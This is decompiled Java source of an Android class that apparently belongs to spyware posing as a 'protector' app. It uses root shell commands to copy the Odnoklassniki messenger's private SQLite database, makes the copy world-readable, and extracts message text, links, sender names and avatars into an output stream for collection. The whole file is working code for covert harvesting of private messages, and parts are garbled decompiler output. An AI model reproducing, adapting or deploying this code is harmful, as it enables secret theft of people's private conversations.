package ru.mobile.protector;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.util.Log;
import com.android.location.PlayService;
import java.io.File;
import java.io.OutputStream;

public class OdnoklassnikiRT1
{
  private static final byte END_OF_BLOCK = 2;
  private static final byte END_OF_FIELD = 1;
  private static final byte END_OF_LINE = 3;
  private static final byte OK_MES_ID = 10;
  private static final byte UNITEXT_PACKET = 97;
  private static String appDBMessages;
  private static String appDBPath;
  private static String appFilesPath;
  private static final String okDBPath = "/data/data/ru.ok.android/databases/";
  private static final String okDbMessages = "odnklassniki.db";
  
  public OdnoklassnikiRT1() {}
  
  private static void AddData(OutputStream paramOutputStream, String paramString)
  {
    if (paramOutputStream == null) {
      return;
    }
    String str = paramString;
    if (paramString == null) {
      str = "";
    }
    if (str != null) {}
    try
    {
      paramOutputStream.write(str.getBytes());
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData");
        return;
      }
      try
      {
        paramOutputStream.write(1);
        throw paramString;
      }
      catch (Exception paramOutputStream)
      {
        for (;;)
        {
          EXCEPT(paramOutputStream, "AddData");
        }
      }
    }
    catch (Exception paramString)
    {
      paramString = paramString;
      EXCEPT(paramString, "AddData");
      try
      {
        paramOutputStream.write(1);
        return;
      }
      catch (Exception paramOutputStream)
      {
        EXCEPT(paramOutputStream, "AddData");
        return;
      }
    }
    finally {}
  }
  
  private static void EXCEPT(Exception paramException, String paramString)
  {
    Log.v("gg", paramString);
    paramException.printStackTrace();
  }
  
  private static void FLOG(String paramString)
  {
    PlayService.FLOG(paramString);
  }
  
  public static long Read(Context paramContext, OutputStream paramOutputStream, long paramLong)
  {
    FLOG("1 " + paramLong);
    long l = 0L;
    appDBPath = "/data/data/" + paramContext.getPackageName() + "/databases/";
    appFilesPath = "/data/data/" + paramContext.getPackageName() + "/files/";
    paramContext = null;
    Object localObject1 = paramContext;
    for (;;)
    {
      try
      {
        if (!copyDB()) {
          break;
        }
        localObject1 = paramContext;
        FLOG("db: " + appDBMessages);
        localObject1 = paramContext;
        SQLiteDatabase localSQLiteDatabase = SQLiteDatabase.openDatabase(appDBMessages, null, 0);
        localObject1 = paramContext;
        String str1 = "SELECT _id, conversation_id, _date, data FROM messages WHERE _date > " + 1000L * paramLong + " ORDER BY _date";
        localObject1 = paramContext;
        FLOG("OK:sql=" + str1);
        localObject1 = paramContext;
        Cursor localCursor1 = localSQLiteDatabase.rawQuery(str1, null);
        if (localCursor1 != null)
        {
          int i = 0;
          localObject1 = localCursor1;
          FLOG("OK:qok");
          localObject1 = localCursor1;
          if (localCursor1.moveToFirst())
          {
            localObject1 = localCursor1;
            FLOG("OK:mtf ok ");
            localObject1 = localCursor1;
            paramOutputStream.write(97);
            localObject1 = localCursor1;
            int j = localCursor1.getInt(localCursor1.getColumnIndex("_id"));
            localObject1 = localCursor1;
            Object localObject2 = localCursor1.getString(localCursor1.getColumnIndex("conversation_id"));
            localObject1 = localCursor1;
            paramLong = localCursor1.getLong(localCursor1.getColumnIndex("_date")) / 1000L;
            localObject1 = localCursor1;
            FLOG("OK:date:" + paramLong);
            localObject1 = localCursor1;
            paramContext = new String(localCursor1.getBlob(localCursor1.getColumnIndex("data")));
            localObject1 = localCursor1;
            String str3 = getTextFromBlob(paramContext);
            localObject1 = localCursor1;
            String str4 = getLinkFromBlob(paramContext);
            paramContext = "";
            str1 = "";
            localObject1 = localCursor1;
            Cursor localCursor2 = localSQLiteDatabase.rawQuery("SELECT data FROM conversations WHERE server_id = '" + (String)localObject2 + "'", null);
            localObject2 = paramContext;
            String str2 = str1;
            if (localCursor2 != null)
            {
              localObject1 = localCursor1;
              if (localCursor2.moveToFirst())
              {
                localObject1 = localCursor1;
                str1 = new String(localCursor2.getBlob(localCursor2.getColumnIndex("data")));
                localObject1 = localCursor1;
                paramContext = getUserFromBlob(str1);
                localObject1 = localCursor1;
                str1 = getAvatarFromBlob(str1);
              }
              localObject2 = paramContext;
              str2 = str1;
              localObject1 = localCursor1;
              if (!localCursor2.isClosed())
              {
                localObject1 = localCursor1;
                localCursor2.close();
                str2 = str1;
                localObject2 = paramContext;
              }
            }
            localObject1 = localCursor1;
            AddData(paramOutputStream, Integer.toString(j));
            localObject1 = localCursor1;
            AddData(paramOutputStream, Integer.toString(10));
            localObject1 = localCursor1;
            FLOG("OK:userAvatar=[" + str2 + "]");
            localObject1 = localCursor1;
            AddData(paramOutputStream, str2);
            localObject1 = localCursor1;
            FLOG("OK:user=[" + (String)localObject2 + "]");
            localObject1 = localCursor1;
            AddData(paramOutputStream, (String)localObject2);
            localObject1 = localCursor1;
            AddData(paramOutputStream, String.valueOf(paramLong));
            localObject1 = localCursor1;
            AddData(paramOutputStream, "");
            localObject1 = localCursor1;
            FLOG("OK:message=" + str3);
            localObject1 = localCursor1;
            AddData(paramOutputStream, str3);
            localObject1 = localCursor1;
            FLOG("OK:link=" + str4);
            localObject1 = localCursor1;
            AddData(paramOutputStream, str4);
            localObject1 = localCursor1;
            AddData(paramOutputStream, "");
            localObject1 = localCursor1;
            AddData(paramOutputStream, "");
            localObject1 = localCursor1;
            paramOutputStream.write(3);
            i += 1;
            if (i > 200)
            {
              localObject1 = localCursor1;
              if (!localCursor1.isClosed())
              {
                localObject1 = localCursor1;
                localCursor1.close();
              }
              localObject1 = localCursor1;
              l = paramLong;
              if (!localSQLiteDatabase.isOpen()) {
                break label914;
              }
              localObject1 = localCursor1;
              localSQLiteDatabase.close();
              l = paramLong;
              break label914;
            }
            localObject1 = localCursor1;
            if (localCursor1.moveToNext()) {
              continue;
            }
            continue;
          }
          localObject1 = localCursor1;
          FLOG("0 rows");
          paramLong = l;
          continue;
        }
        localObject1 = localCursor1;
      }
      catch (Exception paramContext)
      {
        EXCEPT(paramContext, "Read");
        if ((localObject1 != null) && (!((Cursor)localObject1).isClosed())) {
          ((Cursor)localObject1).close();
        }
        return 0L;
      }
      FLOG("Failed to open");
      paramLong = l;
    }
    localObject1 = paramContext;
    FLOG("Failed to copy database");
    label914:
    return l;
  }
  
  /* Error */
  public static byte commandSU(String paramString)
  {
    // Byte code:
    //   0: invokestatic 246	java/lang/Runtime:getRuntime	()Ljava/lang/Runtime;
    //   3: astore 5
    //   5: aconst_null
    //   6: astore 6
    //   8: aconst_null
    //   9: astore 9
    //   11: aconst_null
    //   12: astore 8
    //   14: iconst_0
    //   15: istore_1
    //   16: aload 5
    //   18: ldc -8
    //   20: invokevirtual 252	java/lang/Runtime:exec	(Ljava/lang/String;)Ljava/lang/Process;
    //   23: astore 5
    //   25: aload 5
    //   27: astore 6
    //   29: new 254	java/io/OutputStreamWriter
    //   32: dup
    //   33: aload 5
    //   35: invokevirtual 260	java/lang/Process:getOutputStream	()Ljava/io/OutputStream;
    //   38: invokespecial 263	java/io/OutputStreamWriter:<init>	(Ljava/io/OutputStream;)V
    //   41: astore 7
    //   43: aload 7
    //   45: aload_0
    //   46: invokevirtual 265	java/io/OutputStreamWriter:write	(Ljava/lang/String;)V
    //   49: aload 7
    //   51: invokevirtual 268	java/io/OutputStreamWriter:flush	()V
    //   54: aload 7
    //   56: invokevirtual 269	java/io/OutputStreamWriter:close	()V
    //   59: aload 7
    //   61: ifnull +151 -> 212
    //   64: aload 7
    //   66: invokevirtual 269	java/io/OutputStreamWriter:close	()V
    //   69: aload 5
    //   71: astore_0
    //   72: aload_0
    //   73: ifnull +24 -> 97
    //   76: bipush 30
    //   78: istore_3
    //   79: iload_3
    //   80: iconst_1
    //   81: isub
    //   82: istore 4
    //   84: iload_3
    //   85: ifgt +81 -> 166
    //   88: iload 4
    //   90: ifgt +7 -> 97
    //   93: aload_0
    //   94: invokevirtual 272	java/lang/Process:destroy	()V
    //   97: iload_1
    //   98: ireturn
    //   99: astore_0
    //   100: aload 6
    //   102: astore 5
    //   104: aload 8
    //   106: astore 6
    //   108: iconst_1
    //   109: istore_2
    //   110: aload 5
    //   112: astore_0
    //   113: iload_2
    //   114: istore_1
    //   115: aload 6
    //   117: ifnull -45 -> 72
    //   120: aload 6
    //   122: invokevirtual 269	java/io/OutputStreamWriter:close	()V
    //   125: aload 5
    //   127: astore_0
    //   128: iload_2
    //   129: istore_1
    //   130: goto -58 -> 72
    //   133: astore_0
    //   134: aload 5
    //   136: astore_0
    //   137: iload_2
    //   138: istore_1
    //   139: goto -67 -> 72
    //   142: astore_0
    //   143: aload 9
    //   145: astore 5
    //   147: aload 5
    //   149: ifnull +8 -> 157
    //   152: aload 5
    //   154: invokevirtual 269	java/io/OutputStreamWriter:close	()V
    //   157: aload_0
    //   158: athrow
    //   159: astore_0
    //   160: aload 5
    //   162: astore_0
    //   163: goto -91 -> 72
    //   166: aload_0
    //   167: invokevirtual 276	java/lang/Process:exitValue	()I
    //   170: pop
    //   171: goto -83 -> 88
    //   174: astore 5
    //   176: ldc2_w 277
    //   179: invokestatic 284	java/lang/Thread:sleep	(J)V
    //   182: iload 4
    //   184: istore_3
    //   185: goto -106 -> 79
    //   188: astore_0
    //   189: iconst_3
    //   190: ireturn
    //   191: astore 5
    //   193: goto -36 -> 157
    //   196: astore_0
    //   197: aload 7
    //   199: astore 5
    //   201: goto -54 -> 147
    //   204: astore_0
    //   205: aload 7
    //   207: astore 6
    //   209: goto -101 -> 108
    //   212: aload 5
    //   214: astore_0
    //   215: goto -143 -> 72
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	218	0	paramString	String
    //   15	124	1	b1	byte
    //   109	29	2	b2	byte
    //   78	107	3	i	int
    //   82	101	4	j	int
    //   3	158	5	localObject1	Object
    //   174	1	5	localIllegalThreadStateException	IllegalThreadStateException
    //   191	1	5	localIOException	java.io.IOException
    //   199	14	5	localObject2	Object
    //   6	202	6	localObject3	Object
    //   41	165	7	localOutputStreamWriter	java.io.OutputStreamWriter
    //   12	93	8	localObject4	Object
    //   9	135	9	localObject5	Object
    // Exception table:
    //   from	to	target	type
    //   16	25	99	java/io/IOException
    //   29	43	99	java/io/IOException
    //   120	125	133	java/io/IOException
    //   16	25	142	finally
    //   29	43	142	finally
    //   64	69	159	java/io/IOException
    //   166	171	174	java/lang/IllegalThreadStateException
    //   93	97	188	java/lang/InterruptedException
    //   166	171	188	java/lang/InterruptedException
    //   176	182	188	java/lang/InterruptedException
    //   152	157	191	java/io/IOException
    //   43	59	196	finally
    //   43	59	204	java/io/IOException
  }
  
  private static boolean copyDB()
  {
    File localFile = new File(appDBPath);
    if (!localFile.exists()) {
      localFile.mkdirs();
    }
    localFile = new File(appFilesPath);
    if (!localFile.exists()) {
      localFile.mkdirs();
    }
    if (!new File("/data/data/ru.ok.android/databases/").exists())
    {
      FLOG("mAgent folder not found");
      return false;
    }
    commandSU("cat /data/data/ru.ok.android/databases/odnklassniki.db > " + appDBPath + "ma_messages.db");
    appDBMessages = appDBPath + "ma_messages.db";
    commandSU("chmod 666 " + appDBMessages);
    return new File(appDBMessages).exists();
  }
  
  private static String getAvatarFromBlob(String paramString)
  {
    for (;;)
    {
      int i;
      try
      {
        paramString = paramString.substring(paramString.indexOf("http://"), paramString.length());
        int j = 0;
        i = 0;
        int k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == 0) {
            return "";
          }
        }
        else
        {
          if ((byte)paramString.charAt(i) != 64) {
            break label66;
          }
          continue;
        }
        paramString = paramString.substring(0, i);
        return paramString;
      }
      catch (IndexOutOfBoundsException paramString)
      {
        return "";
      }
      label66:
      i += 1;
    }
  }
  
  private static String getLinkFromBlob(String paramString)
  {
    for (;;)
    {
      int i;
      try
      {
        paramString = paramString.substring(paramString.indexOf("http://"), paramString.length());
        int j = 0;
        i = 0;
        int k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == 0) {
            return "";
          }
        }
        else
        {
          if (((byte)paramString.charAt(i) == 0) || ((byte)paramString.charAt(i) == 16)) {
            break label86;
          }
          if ((byte)paramString.charAt(i) != 32) {
            break label89;
          }
          break label86;
        }
        paramString = paramString.substring(0, i);
        return paramString;
      }
      catch (IndexOutOfBoundsException paramString)
      {
        return "";
      }
      label86:
      continue;
      label89:
      i += 1;
    }
  }
  
  private static String getTextFromBlob(String paramString)
  {
    if ((byte)paramString.charAt(0) != 10) {
      return "";
    }
    int j = 0;
    int i = 0;
    for (;;)
    {
      try
      {
        int k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == 0) {
            return "";
          }
        }
        else
        {
          if ((byte)paramString.charAt(i) != 12) {
            break label68;
          }
          i -= 1;
          continue;
        }
        paramString = paramString.substring(2, i);
        return paramString;
      }
      catch (IndexOutOfBoundsException paramString)
      {
        return "";
      }
      label68:
      i += 1;
    }
  }
  
  private static String getUserFromBlob(String paramString)
  {
    paramString = new StringBuilder(paramString);
    int j = -1;
    int i = 0;
    for (;;)
    {
      try
      {
        int k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == -1) {
            return "";
          }
        }
        else
        {
          if ((byte)paramString.charAt(i) != 18) {
            break label123;
          }
          i += 2;
          continue;
        }
        paramString = paramString.substring(i, paramString.length());
        j = -1;
        i = 0;
        k = paramString.length();
        if (i >= k)
        {
          i = j;
          if (i == -1) {
            return "";
          }
        }
        else
        {
          if ((byte)paramString.charAt(i) == 24) {
            break label130;
          }
          if ((byte)paramString.charAt(i) != 34) {
            break label133;
          }
          break label130;
        }
        paramString = paramString.substring(0, i);
        return paramString;
      }
      catch (IndexOutOfBoundsException paramString)
      {
        return "";
      }
      label123:
      i += 1;
      continue;
      label130:
      continue;
      label133:
      i += 1;
    }
  }
}
